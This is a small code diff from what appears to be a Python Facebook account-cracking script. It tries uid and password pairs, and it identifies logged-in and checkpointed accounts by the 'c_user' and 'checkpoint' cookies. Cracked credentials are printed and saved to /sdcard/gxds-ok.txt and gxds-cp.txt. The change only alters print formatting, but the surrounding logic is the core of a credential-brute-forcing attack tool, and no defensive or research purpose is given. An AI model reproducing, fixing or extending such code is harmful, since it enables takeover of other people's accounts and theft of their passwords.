@@ -1103,12 +1103,12 @@ def gxds_files(uid, pxss):
             ).text
             lxgin = session.cookies.get_dict().keys()
             if "c_user" in lxgin:
-                print(f"\r\r{lgr}  [GXDS-OK] {uid}:{ps}|"+accYr+"")
+                print(f"\r\r{lgr}  [GXDS-OK] {uid}:{ps}|"+accYr)
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
                 break
             elif "checkpoint" in lxgin:
-                print(f"\r\r{lr}  [GXDS-CP] {uid}:{ps}|{accYr}")
+                print(f"\r\r{lr}  [GXDS-CP] {uid}:{ps}|"+accYr)
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 cps.append(uid)
                 break
